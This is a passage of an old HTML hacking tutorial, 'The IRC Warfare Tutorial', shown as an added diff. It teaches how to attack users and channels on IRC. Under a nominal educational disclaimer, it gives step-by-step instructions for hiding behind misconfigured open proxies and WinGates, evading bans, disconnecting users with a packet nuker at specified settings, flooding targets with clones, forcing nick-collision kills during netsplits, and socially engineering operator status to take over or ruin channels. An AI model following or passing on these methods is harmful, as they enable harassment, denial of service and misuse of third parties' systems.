@@ -1,0 +1,1100 @@
+<HTML>
+<HEAD>
+   
+
+   <TITLE>The IRC Warfare Tutorial</TITLE>
+<STYLE type=text/css>A:active {
+	TEXT-DECORATION: none
+}
+A:hover {
+	TEXT-DECORATION: underline
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+</STYLE>
+</HEAD>
+<BODY TEXT="#CCCCCC" BGCOLOR="#000000" LINK="#99CCFF" VLINK="#CC99FF" ALINK="#CCFF00" leftMargin="20" topMargin="3" marginwidth="0" marginheight="0">
+
+<CENTER>
+<HR SIZE=1 NOSHADE WIDTH="60%"></CENTER>
+
+<CENTER><FONT SIZE=+1>The IRC Warfare Tutorial</FONT></CENTER>
+
+<CENTER>Written by <A HREF="mailto:talrun@actcom.co.il">The Cyber God</A></CENTER>
+
+<CENTER><A HREF="http://blacksun.box.sk">http://blacksun.box.sk</A></CENTER>
+
+<CENTER>
+<HR SIZE=1 NOSHADE WIDTH="70%"></CENTER>
+
+
+<P>Version 1.1, 24/9/99
+<BR>Updated , 7/20/01 by <A HREF="mailto:rammal81@hotmail.com">Mikkkeee</A>
+<BR>Converted to HTML by <A HREF="mailto:rammal81@hotmail.com">Mikkkeee</A>
+
+<P><B><U>[Editor Notes]</U></B>
+<BR>Please send comments, questions and feedback to <A HREF="mailto:talrun@actcom.co.il">talrun@actcom.co.il</A>
+<BR>You can always visit us at <A HREF="http://blacksun.box.sk">http://blacksun.box.sk/</A>
+
+<P><B><U>[Disclaimer]</U></B>
+<BR>We will not help you actualize the things that you will learn here.
+<BR>The information here is for educational purposes only (for learning
+how the attacks are done and how to prevent them).
+<BR>We are not responsible in any way for any damage that might happen
+to you. This includes software damages and law issues.
+
+<P><B><U>[Table Of Contents]</U></B>
+<OL>
+<LI>
+<A HREF="#irc">What is IRC?</A></LI>
+
+<LI>
+<A HREF="#intro">An introduction to the way that IRC works</A></LI>
+
+<LI>
+<A HREF="#irc networks">Some notes on different IRC networks and their
+daemon software</A></LI>
+
+<LI>
+<A HREF="#irc war">Why IRC wars started?</A></LI>
+
+<LI>
+<A HREF="#know me">What do the others know about me?</A></LI>
+
+<LI>
+<A HREF="#spoof">How to spoof / hide your identity on the IRC</A></LI>
+
+<LI>
+<A HREF="#bans/bypass">Bans and how to bypass them</A></LI>
+
+<LI>
+<A HREF="#nolikename">I don't like your nickname... / Getting a user off
+the IRC</A></LI>
+
+<LI>
+<A HREF="#cought">Can I get caught and will I?</A></LI>
+
+<LI>
+<A HREF="#netsplit">What are netsplits and how can they help me?</A></LI>
+
+<LI>
+<A HREF="#takeover">Channel Takeovers</A></LI>
+
+<LI>
+<A HREF="#ruin">How To Completly Ruin A Channel</A></LI>
+
+<LI>
+<A HREF="#raw">Some expansion about RAW sessions</A></LI>
+
+<LI>
+<A HREF="#ctcp">Faking /ctcp replies</A></LI>
+
+<LI>
+<A HREF="#https">How to spoof via https proxys</A></LI>
+
+<LI>
+<A HREF="#warscript">War Scripts</A></LI>
+
+<LI>
+<A HREF="#editorial">Editorial - IRC wars, another perspective</A></LI>
+
+<LI>
+<A HREF="#packet">Some interesting articles by Packet</A></LI>
+
+<LI>
+<A HREF="#bib">Bibliography</A></LI>
+</OL>
+<A NAME="irc"></A><B><U>[What is IRC?]</U></B>
+<BR>IRC stands for "Internet Relay Chat". Jarkko Oikarinen originally wrote
+it in 1988. Since starting in Finland, it has been used in over 60 countries
+around the world. It was designed as a replacement for the "talk" program
+but has become much, much more than that. IRC is a multi-user chat system,
+where people meet on "channels" (rooms, virtual places, usually with a
+certain topic of conversation) to talk in-groups, or privately. There is
+no restriction to the number of people that can participate in a given
+discussion or the number of channels that can be formed on IRC.
+
+<P><A NAME="intro"></A><B><U>[An introduction to the way IRC works]</U></B>
+<BR>All the communications in the world of IRC are done through the server.
+(This does not includes the DCC (Direct Client Communication) protocol)
+<BR>When you connect to a server, you send it 2 commands: NICK &amp; USER.
+These commands are used to identify you on the IRC. Here is the format
+of the commands:
+<BR>NICK nickname - Sets your nickname
+<BR>USER username host server :real name - Set your userid and real name.
+Host is your host and server is the server you are connecting to.
+<BR>For example to open a raw IRC session you can telnet to an IRC server
+on port 6667 or 7000 (the standard ports). Here is an example for telneting
+my localhost (note: the lines beginning with * have been written by me.
+The rest are the output I got from the server):
+<BR>* nick ^TCG^
+<BR>NOTICE ^TCG^ :*** If you are having problems connecting due to ping
+timeouts, please type /notice E3AA3478 nospoof now.
+<BR>PING :E3AA3478
+<BR>* user ^TCG^ 127.0.0.1 localhost :The Cyber God
+<BR>:localhost 001 ^TCG^ :Welcome to the DALnet IRC Network ^TCG^!~tcg@thegod.actcom.co.il
+<BR>:localhost 002 ^TCG^ :Your host is localhost[thegod.actcom.co.il],
+running version dal4.6.7.DreamForge.win32
+<BR>:localhost 003 ^TCG^ :This server was created Fri Jul 24 07:48:52 1998
+<BR>:localhost 004 ^TCG^ localhost dal4.6.7.DreamForge.win32 oiwsghOkcfrRaAb
+biklmnopstvR
+<BR>:localhost 005 ^TCG^ NOQUIT TOKEN WATCH=128 SAFELIST :are available
+on this server
+<BR>:localhost 251 ^TCG^ :There are 0 users and 0 invisible on 1 servers
+<BR>:localhost 253 ^TCG^ 4 :unknown connection(s)
+<BR>:localhost 255 ^TCG^ :I have 0 clients and 0 servers
+<BR>:localhost 265 ^TCG^ :Current local users: 0 Max: 0
+<BR>:localhost 266 ^TCG^ :Current global users: 0 Max: 0
+<BR>:localhost 422 ^TCG^ :MOTD File is missing
+<BR>:^TCG^ MODE ^TCG^ :+iw
+<BR>...
+
+<P>ok
+
+<P>As you can see, the second parameter of the USER commands includes my
+IP. You might be thinking right now that you could enter any IP you want
+and fake your IP. Well you are wrong. On really older versions of the IRC
+daemon (Those that were used in Efnet), you WAS able to spoof your IP.
+But today there are 2 types of antispoof-patches: The one that doesn't
+care about the IP you entered and connects you using your real IP (which
+it gets from the socket) and the other one just doesn't allow you to connect
+to the server until you give your real IP address.
+<BR>The first method of Anti-Spoofing is most used most in the server version
+of DALnet and the second is used most by EliteIRCD (which is based on DALnet)
+and the servers that are based on it.
+<BR>Now, if it all goes ok then you just opened a raw session to IRC!
+<BR>All the data transferred to the user (Private Messages/Notices and
+Channel Events) is transferred from the server. If the user that sent you
+a message is on a DIFFERENT server than you (but NOT a different network)
+the message "moves" from the servers until it reaches your server and you.
+To send someone a message in our raw IRC session type: 'PRIVMSG nick :message'
+(without the quotes) where nick is the target nickname and message is the
+message (You must include a : before the message).
+<BR>When a message moves from server to server it looks like this:
+<BR>:SenderNick PRIVMSG nick :message
+<BR>All the IRC commands move from server to server like this. For example
+when someone uses the NICK command ALL the servers get a notice about it.
+<BR>&nbsp;
+
+<P><A NAME="irc networks"></A><B><U>[Some notes on different IRC networks
+and their daemon software]</U></B>
+<BR>Different IRC networks have different IRC daemons. It is important
+to know the futures / limits of the server your network uses. For example,
+OLD Efnet servers don't know the +b channel mode (ban someone). When trying
+to start IRC wars you need to know what are the limitations of the server.
+If it got services, if so does they have a bug that can crash them? Can
+you obtain Channel Operator in a net-split (we'll get to that)? And so
+on... During the rest of this tutorial we will discuss different daemon
+software and bugs, as well as different ways to "get in".
+
+<P><A NAME="irc war"></A><B><U>[Why IRC wars started?]</U></B>
+<BR>Generally, IRC wars started on the IRC network Efnet. In this IRC network
+you can't register your nickname so ANYONE can use it. If for example someone
+logged to this IRC network (By the way, did you know that it is the first
+IRC network ever (!)) and he saw that his nick is taken. He probably said
+something like "How Rude?!" or "Mother-F*cker" or anything else. Then he
+started thinking about ways to get this user off the server. Users started
+to try many different things on each other and that's pretty much how IRC
+wars started. Today, users might start IRC wars "just for fun", or for
+taking over channels they don't like or kicking off users they don't like.
+
+<P><A NAME="know me"></A><B><U>[What do the others know about me?]</U></B>
+<BR>OK people! This is actually the first important thing about the IRC
+wars. Before starting out you need to know what others can find out about
+you and what can you find out about them.
+
+<P>If you are not connected through a BNC, firewall or a shell (we'll get
+to this neat stuff later), what I mean, that if you are connected directly
+to the IRC, using a dial-up for example users can first of all knows your
+IP. Newbies might say right now, ok... well.... So he knows my IP... who
+gives a shit anyway?
+<BR>Well if you said this you are wrong. Let's take a look on my host (resolved
+IP) for example:
+<PRE>P34.haifa2.actcom.co.il
+|&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_ You can see that my ISP is in Israel, and so am I (unless
+|&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I'm dialing to foreign ISPs just to cover my identity, which&nbsp;
+|&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; is a thing people don't do because of... financial issues).
+|&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_ You can see that my ISP (Internet Service Provider) is Actcom
+|&nbsp;&nbsp;&nbsp; |_ You can see that I am from Haifa ).
+|_My modem number at the ISP's office.</PRE>
+See how many things the host gave you?
+<BR>1) My ISP
+<BR>2) My city
+<BR>3) My country
+<BR>Now You can also know that if my ISP address is actcom.co.il you can
+send complains about me to abuse@actcom.co.il for example, give them my
+IP and tell them what I did to you and they will do the rest.
+
+<P>That is what users know about you. Some times you will only see numbers
+like 19.114.47.1 and not the host. That is because the server failed to
+resolve your hostname. To resolve it you can download a program called
+'nslookup' from somewhere (note: nslookup comes with all Unix systems),
+give it the IP and it will try to resolve it. Also see the entry 'DNS Servers'
+in the Newbies Corner.
+<BR>Now, for those who don't know you can get the IP/host by "whoising"
+the user.
+<BR>To do a whois on a user in mIrc, BitchX, IRCii, Pirch and some other
+known IRC clients all you need to do is type /whois nickname
+<BR>To whois someone in our raw connection (the one I taught you how to
+establish at the beginning) type 'whois nickname' (without the quotes)
+<BR>Here is what I get when I whois my self in the raw connection:
+<BR>whois ^TCG^
+<BR>:localhost 311 ^TCG^ ^TCG^ ~TCG thegod.actcom.co.il * :The Cyber God
+<BR>:localhost 312 ^TCG^ ^TCG^ localhost :test server
+<BR>:localhost 317 ^TCG^ ^TCG^ 9 932030074 :seconds idle, signon time
+<BR>:localhost 318 ^TCG^ ^TCG^ :End of /WHOIS list.
+<BR>Ok, before I explain what you got here, here is the format:
+<BR>Format: :server-name raw-number sender target data.
+<BR>Server-name is the server that gives you the data.
+<BR>Raw-number is the ID of the data you got (it is used to determine what
+data you are getting).
+<BR>Sender: the senders nickname (you!!).
+<BR>Target: The target (The nick you are whoising).
+<BR>Data: The data.
+<BR>Now here is an explanation on all the 4 lines
+<BR>In the first one you see the user-name and the host of the user, you
+also see his real name:
+<PRE>~TCG thegod.actcom.co.il * :The Cyber God
+&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_ The user's real name (you can fake this :))
+&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp; |_ The user host or IP
+&nbsp; |
+&nbsp; |_ The username (set by IdentD, will be explained later,
+&nbsp;&nbsp;&nbsp;&nbsp; when followed by a '~' you see that the IdentD is NOT&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp; running and the Ident (username) might be fake).</PRE>
+&nbsp;
+<PRE>The second line:
+localhost :test server
+&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_ Comment about the server (set by the server admin)
+&nbsp;&nbsp;&nbsp; |_ The server that user is connected to</PRE>
+&nbsp;
+<PRE>Third line:
+9 932030074 :seconds idle, signon time
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_When the user signed in
+|_ How many seconds has he been idle</PRE>
+&nbsp;
+<PRE>Last line:
+:End of /WHOIS list.
+&nbsp;&nbsp;&nbsp;&nbsp; |_ Shows you that there is no more data.</PRE>
+Also, when users know your IP they can start almost any Denial of Service
+(DoS) attack on your host like WinNuke (Arggg... Lame Lame Lame!!!) or
+a lovely ping flood that will chew up all of your bandwidth, depending
+on the attacker's bandwidth (for more info and more sophisticated DoS attacks,
+see the DoS tutorial at blacksun.box.sk).
+
+<P><A NAME="spoof"></A><B><U>[How to spoof / hide your identity on the
+IRC]</U></B>
+<BR>After seeing what users can find out about you, it is time to learn
+how to hide your identity.
+
+<P>There is no easy and lame way to do this. Here are the most knows ways:
+FireWall, WinGate and a Bouncer aka (As Knows As) BNC.
+<BR>We will start from the firewall.
+<BR>The firewall we are talking about is software that runs on some machine
+and is used to filter incoming packets (packets that arrive to the machine
+which is running the firewall) and outgoing packets (packets that are sent
+from the machine which is running the firewall). Some firewalls are not
+configured very well and allow anyone to connect to them. The hard part
+is to find a working one that will allow you to use it to connect through
+it, and once you are connected, using it so users that will whois you or
+dns you will see the firewall's IP! If, for example, there is a misconfigured
+FireWall on the host firewall.someone.com, you can use it in mIRC, for
+example, by starting the mIRC program (I use the newest version 5.6, go
+download it at www.mirc.co.uk) and:
+<BR>1. Click on the Files menu, then Options.
+<BR>2. On the topmost label of the tree where you can see 'Connect', If
+you see a '+' next to it click it. If you see a '-' go to the next step
+<BR>3. Click on the sub-item Firewall (duh...)
+<BR>4. Be sure the 'Use SOCKS firewall' checkbox is marked (has an 'X'
+in it).
+<BR>5. In the Hostname field, write the IP / Hostname of the firewall.
+For example lets use firewall.someone.com
+<BR>6. Leave the USER ID and PASSWORD empty, and make sure the port in
+1080.
+<BR>7. Click OK.
+<BR>Now, next time you will type /server ... To connect to the IRC server
+the connection will be relayed through the firewall, so if someone will
+whois you he would see something like this:
+
+<P>:localhost 311 ^TCG^ ^TCG^ ~TCG firewall.someone.com * :The Cyber God
+<BR>:localhost 312 ^TCG^ ^TCG^ localhost :test server
+<BR>:localhost 317 ^TCG^ ^TCG^ 9 932030074 :seconds idle, signon time
+<BR>:localhost 318 ^TCG^ ^TCG^ :End of /WHOIS list.
+
+<P>You can see that my host is NO LONGER thegod.actcom.co.il, instead it
+is now firewall.someone.com!!
+<BR>Now I am protected. You might be asking right now where to get the
+firewalls hosts. One idea is go asking your friends. Other is going to
+Altavista (www.altavista.com) and searching for "firewall AND list" and
+stuff like that.
+
+<P>Another way of spoofing your IP is a WinGate. WinGate is software for
+Windows that is used to let several computers that are connected through
+a local network of some sort to use one computer's Internet access. It
+also allows you to fake your IP _EXACTLY_ the same way. After installing
+WinGate, anyone will be able to use it if you don't configure it well (I
+personally recommend using SyGate instead). To find Wingate addresses you
+can ask your friends, run a Wingate scanner that will scan whole subnets
+for Wingates or look for lists on the web.
+
+<P>Note: newer versions of the IRC daemons will automatically check for
+an open Wingate or a firewall, and if they will detect one they will kill
+your session and might even K-Line (Ban the host from using the server/network)
+the host as well.
+
+<P>Now, on to the Bouncer (aka BNC) spoofing.
+<BR>Bouncer is software that runs on Unix computers. If, for example, there
+is a BNC on bnc.shell.com on port 1234, you can connect to it by typing:
+/server bnc.shell.com 1234
+<BR>After that you should be getting something like this:
+<BR>-BNC- Please type your password via /quote pass
+<BR>Crap... You need a password. If you know the password you have no problem.
+Just type '/qoute pass password' (without the quotes), and replace 'password'
+is your password.
+<BR>If you don't know the password you need to ask the guy that gave you
+the BNC (or you could always hack the server... ;) but this tutorial is
+about IRC warfare, not hacking servers and getting passwords). You should
+also ask him if it (the BNC) has vhosts. Vhosts are multiple IPs and hostnames
+for the same BNC. If it has vhosts, you can set your active host by typing
+'/quote vip the.host.name.here' (as you should be able to figure by now,
+it is done without the quotes).
+
+<P>After this you type '/conn server'. For example /conn irc.dal.net will
+connect you to irc.dal.net with the bouncer's host.
+
+<P>Note: unlike firewalls and badly configured Wingates, the server cannot
+detect a BNC, so there is no chance you will be banned for using it.
+
+<P><A NAME="bans/bypass"></A><B><U>[Bans and how to bypass them]</U></B>
+<BR>Channel Operators might ban you after you have done something in their
+channel that made them angry :( .
+<BR>To bypass a ban you first need to know the ban type. There are a few
+ban types:
+<BR>1. nick!*@* - Bans you by your nickname. All you need to do is change
+your nick (by typing /nick newnick, or in raw session NICK newnick) and
+you can reenter the channel.
+<BR>2. *!user@* - Bans you by your Ident (UserID). If your computer is
+not running an IdentD daemon (A win9x with mIRC for example) you can easily
+change your Ident by clicking on the File menu, selecting Options, opening
+the 'Connect' sub-tree, clicking the IdentD label and changing the User
+ID. If you are under a Unix / Linux machine that is already running an
+IdentD daemon, you can't change it because it automatically sets your ident
+username to your login name. To change this you need to logon to the IRC
+through a Bouncer because bouncers fake you IdentD.
+<BR>3. *!*@host - You are banned by your IP / host. All you need to do
+is to connect through a firewall or a Wingate.
+<BR>Some times the bans are more complex like ^TCG^!*@*.actcom.co.il.
+<BR>This ban will prevent anyone named ^TCG^ with host that ends with .actcom.co.il
+<BR>If you are interested here is the format:
+<PRE>Nick!user@host / IP
+&nbsp;|&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_ The IP or hostmask.
+&nbsp;|&nbsp;&nbsp;&nbsp; |
+&nbsp;|&nbsp;&nbsp;&nbsp; |_ Your username. The IdentD sets this. When running IdentD daemon it
+&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mostly not faked but when running windows or connection through a&nbsp;
+&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bouncer it is probably faked.
+&nbsp;|
+&nbsp;|_The user nickname. If might also contain wildcards like *T*C*G*.
+&nbsp;&nbsp; This will prevent anyone with the letters T, C and G (in this order)&nbsp;
+&nbsp;&nbsp; to join the channel.</PRE>
+
+<PRE>Examples: ^TCG!*@*.actcom.co.il
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_________The server
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | |_Your Ident user (defined as the wildcard '*', meaning ANYTHING)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_Your nickname</PRE>
+As you probably know, channels have different modes. For example +o to
+make a certain person an OP (Operator), +b to ban a person etc'. To set
+a ban you type: /mode #Channel +b nick!user@host and to remove a ban you
+type /mode #Channel -b nick!user@host
+<BR>On a raw session you don't need the '/'.
+
+<P><A NAME="nolikename"></A><B><U>[I don't like your nickname... / Getting
+a user off the IRC]</U></B>
+<BR>The easiest way to get a user off the IRC is using a program called
+"Click2" for Windows.
+<BR>If might not always work and it is considered extremely lame, but it
+might work sometimes.
+<BR>After you got this program, do the following:
+<BR>1. Set the "Packets to:" option box to "Clinet"
+<BR>2. In the Server textbox fill-in the TARGET server. You can figure
+it out by doing a /whois or a /dns on the target's nickname.
+<BR>3. In the Client textbox fill-in the TARGET IP address. You can also
+figure this by doing a /whois or /dns on him but if he uses any spoofing
+technique like a BNC or a Wingate it won't harm him even a bit (it may
+harm the Wingate / Firewall / BNC, though).
+<BR>4. Be sure that you set it to send 64 packets every 1000ms in the 2
+textboxes at the end of the window.
+<BR>5. The client start port should be 1024 and the stop 1500.
+<BR>6. Now hit nuke....
+<BR>This is what you will see if it worked and you were in a channel, and
+the target in also in this channel:
+<BR>*** Quits: ^TCG^ (Connection reset by peer)
+<BR>(Or something likes this)
+
+<P>The target should see something like this:
+<BR>*** [10053] Software caused connection abort
+
+<P>If it is not working, you won't see anything and he won't either. If
+he is running some packet-logger that logs ICMP packets he will see your
+IP but most users do not run these.
+
+<P>Another lame way is to try winnuking the address. I won't explain here
+how to do it and what winnuke is because it has nothing to do with this
+tutorial (see R a v e N's DoS tutorial for Winnuke information, as well
+as information on more sophisticated attacks).
+
+<P>Here is a more complex way.
+<BR>You will need a flood program like "Floods". (Ask me if you want it)
+<BR>After running it or any other flooding script that is based on clone
+loading you connect the clones to the target IRC server. (~6 clones should
+do the job)
+<BR>Before we continue, I want to explain you how this works.
+<BR>Each user on the IRC got something called SendQ and RecvQ. They contain
+the data the user is sending / receiving.
+<BR>They also have a maximum value. If this value is achieved, the server
+will automatically close their connection.
+<BR>Flood programs and flood scripts load clones (computer-operated IRC
+"users") and start sending lot of crap to the target nick, causing his
+RecvQ to fill up and he should get disconnected :).
+
+<P>So after you launched the program, you start flooding. I can't tell
+you exactly how because there are lot of programs and I can't explain you
+how every one works, but I can help you via my e-mail: talrun@actcom.co.il
+<BR>There are also more advanced programs that support clone loading through
+firewalls and Wingates. When a user loses his connection to the IRC because
+of such an attack, everyone on every channel he was present on will see
+the following:
+<BR>*** Quits: ^TCG^ (Excess Flood)
+
+<P>Another way of disconnecting a user from the IRC is exploiting a bug
+in his OS. You need to determine his OS and start this attack on him. There
+are lots of different types of attacks. To learn about them, read R a v
+e N's DoS tutorial.
+
+<P><A NAME="cought"></A><B><U>[Can I get caught and will I?]</U></B>
+<BR>First of all, it depends on what you are going to do or already did.
+<BR>When you are going to take over a channel for example, if you are doing
+it without hiding your identity first (See previous chapter) you can get
+caught but nothing will probably happen to you. You might receive a DoS
+attack that can terminate your IRC session or lag you like hell. If you
+are using a bouncer for example, you won't get caught for this. But if
+you "click" someone and he logs the packets he can e-mail your ISP with
+your IP and they might kill your account.
+<BR>&nbsp;
+
+<P>If you are killing someone with a netsplit (See next chapter) you won't
+get caught and nothing will happens to you since you haven't done anything
+illegal.
+
+<P>Also, it is good to know as much as possible about your target. If you
+see some one that is named 'Ass^Hole' for example, you have no good reason
+to go packet him or flood him. He might have access to an OC3 or a DS-3
+line (Extremely fast connections to the Internet) and he might also detect
+your attacks and start flooding you in return. Trust me, you don't want
+this to happen. One day my T3 line got ping flooded from an OC3 line and
+it stopped working for about 30 minutes. Just for your information, OC3
+can transfer up to 255Mbit and a T3 can transfer up to 9Mbit (I think).
+If such a line will flood your computer you don't stand a chance.
+
+<P><A NAME="netsplit"></A><B><U>[What are netsplits and how can they help
+me?]</U></B>
+<BR>Large IRC networks consist of various servers. A NetSplit occurs when
+a link between one of the servers and the others gets broken because of
+lag or other reasons. All users that were connected to this channel will
+be separated from the others as long as the netsplit occurs.
+<BR>Therefore, lots of channels become empty, and get closed. When you
+will join a channel that became empty, or you left only 1 user in the channel
+and you will cycle it, there is a chance that you will obtain the channel
+operator status (OP, @).
+<BR>On a NetJoin (When the server relink to the entire network again) you
+might still have the channel operator status. On new servers, you won't
+get the operator status when the network is in a spilt mode, but if you
+could find an old server or network you just might get lucky. Breaking
+a connection between 2 servers by yourself is very difficult. You need
+to pick 2 servers that are already lagged and start ping-flooding the target
+server from a fast connection.
+<BR>Once a netjoin occurs, it is recommended to have a war script (we'll
+get to those) that will DeOP everyone on the channel so other OPs won't
+be able to DeOP you.
+
+<P>NetSplits can also let you disconnect a user from the IRC. Let's say
+you want to disconnect a user named 'Lamer'. When a netsplit occurs, there
+are two different possibilities:
+<BR>1) The target user ('Lamer', in our case) was on the server that did
+the netsplit and has left the IRC network, but will return once a netjoin
+occurs (shouldn't take a lot of time).
+<BR>2) The user is still on the network and has nothing to do with the
+netsplit.
+<BR>If number 1 occurs then all you need to do is connect to the network
+using his nickname and wait for the netjoin. When the servers will re-link
+they will see that there are 2 users with the same nickname. Such thing
+cannot possibly happen, so one user must be killed. The user that was NOT
+on the network, (which means he was on the splitted server) will probably
+get killed. If option 2 occurs then all you can do is to put a clone (open
+another IRC sesssion), connect to the splitted server and change your nick
+to his nick. When the servers will rejoin there is a small chance that
+he will get killed, so cross your fingers. :)
+
+<P>Now, for the 1,000,000$ question: how do I detect a netsplit? You can
+detect a netsplit if the user(s) quit message is "Server1 Server2". For
+example:
+<PRE>Lamar has quit IRC (irc.magic.com irc.freei.net)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_Server2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_Server1</PRE>
+This message tells you that there is a split between irc.magic.com and
+irc.freei.net
+<BR>The second server (Server2) is the server that left the net.
+
+<P><A NAME="takeover"></A><B><U>[Channel Takeovers]</U></B>
+<BR>Channel takeovers are used to take a channel from a user, and prevent
+him from reentering the channel or gaining operator status in the channel.
+The first thing you need to do is to get ops. Here are 4 ways to get ops:
+<BR>1. Via a NetSplit. (might take a lot of time)
+<BR>2. Asking one of the ops to let you be an op (Who knows? You might
+get lucky).
+<BR>3. Running a bot on your computer or on a shell account and telling
+the other ops that it is online 24 hours a day, and ask them to op it.
+They might do it, then tell the bot to op you.
+<BR>4. You can always lure the other ops into giving you op by telling
+them that you will advertise their channel and bring them users and you
+might earn the ops status.
+<BR>You can do nothing without the OP status. Here is what you do after
+you got an op and you want to close they're channels:
+<BR>1. First, mass de-op all the users so they won't kick or ban you. There
+are a lot of scripts out there that will do this for you.
+<BR>2. Then place a ban on *!*@*
+<BR>3. Mass-Kick the channel (also with a script)
+<BR>4. After this set the following modes: +smilk 1 1 (you type /mode #Channel
++smilk 1 1)
+<BR>5. You took over the channel! :)
+<BR>There is a problem with this, when you will leave the channel he will
+get empty and then closed. The only solution for this is placing a 24/7
+(24 hours a day, 7 days a week) bot in the channel. If channel services
+are available on this network (Like in DALnet), you can register the channel
+if no one else have done this already.
+<BR>If you took over a registered channel, you will have a problem keeping
+it because Channel Services can give the channel back to its legal owner
+with no problem.
+
+<P><A NAME="ruin"></A><B><U>[How to completely ruin a channel]</U></B>
+<BR>Here are some possible ways to completely ruin a channel:
+<BR>1) Turning the channel into an invite-only channel, so only people
+who were invited (to invite people, type /invite nick) can join.
+<BR>2) Making the channel password-protected.
+<BR>3) Making sure that you are the only OP in the channel and then turning
+the channel into moderated mode and then mass-devoicing everyone. In moderated
+mode, only voiced users (people with a little + in the beginning of their
+nick. To voice people, do /mode #channel +v nick or -v to devoice) can
+talk. That way, users will be able to see who is on the channel (note:
+you can see who's on a channel without joining it by typing /names #channel),
+but they won't be able to chat, and they will have to listen to you...
+:)
+
+<P><A NAME="raw"></A><B><U>[Some expansion about RAW sessions]</U></B>
+<BR>Too lazy to read RFC ?
+<BR>Well, this is the "SUMMARY" of rfc1459 (IRC Protocol). Hopefully after
+reading this you'll have better understanding of how the protocol work
+(hey... don't just use it... try to understand how it work). Yeah... this
+is also how some people spoof their IP by telneting from some restricted
+shell account with no IRC client access.
+
+<P>[Connecting to the IRC daemon]
+
+<P>Telnet/netcat (yep... we're gonna use a raw socket) to the IRC port
+(6667/6668..etc) of the IRC server.
+
+<P>eg &lt;:> telnet irc.dal.net 6667
+
+<P>Send your nick &amp; username to be recognized after u got connected
+using the user command in this form "user&nbsp;<username><hostname><servername><realname>".
+
+<P>eg &lt;:> user nobody localhost localhost :I'm nobody nick nobody
+
+<P>-------------------------[!! NOTE !!]-------------------------
+<BR>At any time if your receive anything like this
+<BR>ping :1234567 &lt;-- The sequence number change all the time
+<BR>or
+<BR>ping :192.0.0.1 &lt;-- Some IP address
+
+<P>You must send back the number with a pong
+<BR>eg &lt;:> pong :1234567
+<BR>or
+<BR>pong :192.0.0.1
+
+<P>If you don't pong back, you'll be disconnected with a ping timeout error.
+<BR>---------------------[!! END OF NOTE !!]-------------------
+
+<P>[Exploring some basic commands]
+
+<P>Ok, after the nick &amp; user commands you can start chatting now. Type
+join #channel (Without the /) to join #channel.
+
+<P>(Yea... most commands you use in your BitchX or mIRC client can also
+be
+<BR>used here too...just don't include the /
+<BR>eg: part #channel
+<BR>quit :I'm out
+<BR>etc... )
+
+<P>To send your message to a channel, use the privmsg command.
+
+<P>eg &lt;:> privmsg #channel : Hi guys...Sup? (Dont forget the ":" if
+you are going to send more then one word)
+
+<P>This will send "Hi guys...Sup?" to #channel
+
+<P>To send a private message to a user:
+<BR>eg &lt;:> privmsg nickname : HI ya
+
+<P>This will send "HI ya" to nickname.
+
+<P>To set a mode on a channel you simply type mode #channel mode.
+<BR>For example, MODE #Channel +b 192.114.*.* will ban everyone that they're
+IP begin with 192.114.
+
+<P>[Fun stuff to do]
+
+<P>If you get something like this ":nick!user@ip-address PRIVMSG your-nick
+:_VERSION_"
+<BR>this means that nick is trying ctcp/version you. This command is used
+to find out your version.
+<BR>Send the version back using the NOTICE command... it could be anything
+you want.
+
+<P>eg : NOTICE nick :_VERSION Telnet version 0.1 :) _
+
+<P>This will send "Telnet version 0.1 :)" as the version reply.
+
+<P><A NAME="ctcp"></A><B><U>[Faking /CTCP Replies]</U></B>
+
+<P>Now many of you guys chat and have various people always doing{Client
